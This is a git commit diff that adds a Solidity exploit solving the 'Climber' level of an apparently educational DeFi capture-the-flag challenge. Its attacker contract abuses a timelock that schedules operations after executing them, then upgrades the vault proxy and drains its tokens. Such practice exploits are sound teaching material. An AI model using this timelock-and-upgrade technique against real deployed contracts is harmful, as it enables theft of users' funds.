3e3f63ba931c2db58741981a51748bb56b440928
Tanner Ang <ang713943@gmail.com>
2024-01-31 17:47:02 +0800

    complete 12-Climber

--- test/Levels/climber/Climber.t.sol
+++ test/Levels/climber/Climber.t.sol
@@ -9,6 +9,8 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
 
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
 
@@ -72,6 +74,11 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        ClimberAttacker climberAttacker =
+            new ClimberAttacker(address(climberVaultProxy), address(dvt), payable(address(climberTimelock)));
+        climberAttacker.attack();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -86,5 +93,58 @@ contract Climber is Test {
          */
         assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
+    }
+}
+
+contract ClimberAttacker {
+    address climberVaultProxy;
+    address dvt;
+    address payable climberTimelock;
+    address attacker;
+    FakeClimberVault fakeClimberImplementation;
+
+    address[] targets = new address[](4);
+    uint256[] values = new uint256[](4);
+    bytes[] dataElements = new bytes[](4);
+    bytes32 salt = "";
+
+    constructor(address climberVaultProxy_, address dvt_, address payable climberTimelock_) {
+        climberVaultProxy = climberVaultProxy_;
+        dvt = dvt_;
+        climberTimelock = climberTimelock_;
+        attacker = msg.sender;
+
+        targets[0] = climberVaultProxy;
+        targets[1] = climberTimelock;
+        targets[2] = climberTimelock;
+        targets[3] = address(this);
+
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+
+        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", address(this));
+        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        dataElements[2] =
+            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
+        dataElements[3] = abi.encodeWithSignature("scheduleBeforeExecution()");
+    }
+
+    function attack() external payable {
+        ClimberTimelock(climberTimelock).execute(targets, values, dataElements, salt);
+        fakeClimberImplementation = new FakeClimberVault();
+        ClimberVault(climberVaultProxy).upgradeTo(address(fakeClimberImplementation));
+        FakeClimberVault(climberVaultProxy).exploit(dvt, attacker);
+    }
+
+    function scheduleBeforeExecution() external {
+        ClimberTimelock(climberTimelock).schedule(targets, values, dataElements, salt);
+    }
+}
+
+contract FakeClimberVault is ClimberVault {
+    function exploit(address dvt, address to) external {
+        IERC20(dvt).transfer(to, IERC20(dvt).balanceOf(address(this)));
     }
 }
